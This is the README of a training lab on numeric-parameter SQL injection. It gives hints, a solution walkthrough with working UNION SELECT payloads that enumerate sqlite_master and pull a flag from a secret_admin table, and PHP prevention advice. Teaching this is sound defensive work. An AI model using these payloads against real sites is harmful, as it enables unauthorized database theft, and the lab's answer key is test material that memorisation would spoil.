# SQL Injection Lab - Numeric Parameter Injection

## 📚 Description

This lab demonstrates a **Numeric Parameter SQL Injection** vulnerability where the injection point is a numeric parameter that isn't wrapped in quotes. This is a common vulnerability in product detail pages, user profile pages, and any URL with numeric IDs.

**Difficulty Level:** Easy
**Technique:** Numeric Parameter Injection (No Quotes Needed)

## 🎯 Learning Objectives

After completing this lab, you will understand:

1. How numeric SQL injection works (without quote escaping)
2. Why numeric parameters are dangerous
3. Using UNION injection without quotes
4. Discovering hidden tables and extracting data
5. The difference between quoted and unquoted parameters

## 🚀 How to Run

```bash
cd /home/labuser/tools/lab-sql/lab-sqli-numeric
./start.sh
```

## 🎮 Challenge

Extract the flag from the hidden `secret_admin` table by exploiting the numeric `id` parameter in the product detail page.

### What You Know

- URL parameter: `?id=1` (numeric, no quotes)
- Query structure: `SELECT * FROM products WHERE id = <NUMBER>`
- No quotes around the parameter
- The flag is in `secret_admin` table

### Key Difference

**String parameter (needs quotes):**
```sql
SELECT * FROM users WHERE username = 'john'
                              ↑           ↑
                              quotes needed
```

**Numeric parameter (no quotes):**
```sql
SELECT * FROM products WHERE id = 1
                                  ↑
                                  NO quotes!
```

## 💡 Hints

<details>
<summary>Hint 1: Understanding Numeric Injection</summary>

Since the parameter is numeric and not quoted, you don't need to escape quotes. You can inject SQL directly after the number.
</details>

<details>
<summary>Hint 2: Testing Injection</summary>

Try: `?id=1 AND 1=1`

This creates: `SELECT * FROM products WHERE id = 1 AND 1=1`

If it works, the page loads normally.
</details>

<details>
<summary>Hint 3: Finding Column Count</summary>

Use ORDER BY to find how many columns exist:
- `?id=1 ORDER BY 1` (works)
- `?id=1 ORDER BY 5` (error = 4 or less columns)

Or use UNION with NULL values:
- `?id=1 UNION SELECT 1,2,3,4--`
- Keep adding numbers until no error
</details>

<details>
<summary>Hint 4: UNION Injection</summary>

Once you know the column count (let's say 6):
```
?id=1 UNION SELECT 1,2,3,4,5,6 FROM secret_admin--
```

This creates:
```sql
SELECT * FROM products WHERE id = 1 UNION SELECT 1,2,3,4,5,6 FROM secret_admin--
```
</details>

<details>
<summary>Hint 5: Discovering Hidden Tables</summary>

Query sqlite_master:
```
?id=1 UNION SELECT 1,2,3,4,5,6 FROM sqlite_master WHERE type='table'--
```

Then check column 2 (or 3, etc.) for table names like `secret_admin`.
</details>

<details>
<summary>Hint 6: Extracting the Flag</summary>

Map the flag column to a visible column (like product_name):
```
?id=1 UNION SELECT 1,admin_value,3,4,5,6 FROM secret_admin WHERE admin_key='flag'--
```

This places the flag value in the product_name position.
</details>

## 🔧 Solution Walkthrough

<details>
<summary>Click to reveal the solution</summary>

### Step 1: Determine Column Count

Test with UNION SELECT:
```
?id=1 UNION SELECT 1--        (works)
?id=1 UNION SELECT 1,2--       (works)
?id=1 UNION SELECT 1,2,3--       (works)
?id=1 UNION SELECT 1,2,3,4--       (works)
?id=1 UNION SELECT 1,2,3,4,5--       (works)
?id=1 UNION SELECT 1,2,3,4,5,6--       (works)
?id=1 UNION SELECT 1,2,3,4,5,6,7--       (error!)
```

Result: **6 columns**

### Step 2: Test UNION Injection

```
?id=1 UNION SELECT 1,2,3,4,5,6--
```

This creates:
```sql
SELECT * FROM products WHERE id = 1 UNION SELECT 1,2,3,4,5,6--
```

If the page loads with numbers showing, UNION works!

### Step 3: Discover Hidden Tables

```
?id=1 UNION SELECT 1,sql,3,4,5,6 FROM sqlite_master WHERE type='table'--
```

The `sql` column (column 2) will show CREATE statements, revealing:
- `CREATE TABLE products (...)`
- `CREATE TABLE secret_admin (...)`

### Step 4: Get Secret Table Structure

```
?id=-1 UNION SELECT 1,sql,3,4,5,6 FROM sqlite_master WHERE name='secret_admin'--
```

This reveals:
```sql
CREATE TABLE secret_admin (
    id INTEGER PRIMARY KEY,
    admin_key TEXT UNIQUE NOT NULL,
    admin_value TEXT NOT NULL
)
```

### Step 5: Extract the Flag

The columns are:
1. `id` (INTEGER) → map to column 1
2. `admin_key` (TEXT) → map to column 2
3. `admin_value` (TEXT) → map to column 2 or 3

**Working payload:**
```
?id=-1 UNION SELECT 1,admin_value,3,4,5,6 FROM secret_admin WHERE admin_key='flag'--
```

Using `-1` ensures no product matches, so only UNION results appear.

The flag appears in the product name!

### Alternative Payloads

**Extract all data:**
```
?id=-1 UNION SELECT 1,admin_key||': '||admin_value,3,4,5,6 FROM secret_admin--
```

**Using different column mapping:**
```
?id=-1 UNION SELECT 1,2,admin_value,4,5,6 FROM secret_admin WHERE admin_key='flag'--
```

### Why It Works

The query becomes:
```sql
SELECT * FROM products WHERE id = -1 UNION SELECT 1,admin_value,3,4,5,6 FROM secret_admin WHERE admin_key='flag'--
```

1. `id = -1` → No product has ID -1, so first query returns nothing
2. `UNION` → Combines results (only our injected query returns data)
3. `admin_value` → Contains the flag
4. The flag value appears in position 2 (product_name column)

The flag displays as the product name!

</details>

## 🏁 Success Criteria

- [ ] You identified this as a numeric injection point
- [ ] You determined the correct column count (6)
- [ ] You discovered the `secret_admin` table
- [ ] You successfully extracted the flag using UNION
- [ ] You understand why no quotes were needed

## 🛡️ Prevention

Numeric SQL injection can be prevented by:

1. **Type Casting/Validation**:
```php
$product_id = (int)$_GET['id'];
// OR
$product_id = intval($_GET['id']);
```

2. **Using Prepared Statements**:
```php
$stmt = $pdo->prepare("SELECT * FROM products WHERE id = ?");
$stmt->execute([$product_id]);
```

3. **Input Validation**:
```php
if (!is_numeric($product_id)) {
    die("Invalid product ID");
}
```

4. **Whitelist Validation** for product IDs that exist

## 📝 Notes

- This lab is for **educational purposes only**
- The flag is dynamically generated
- Numeric injection is simpler than string injection (no quotes needed)
- Common in e-commerce sites, blogs, CMS platforms
- Always validate and sanitize numeric inputs

---

**Author:** IDS – CyberSec Academy Lab Authoring Guideline
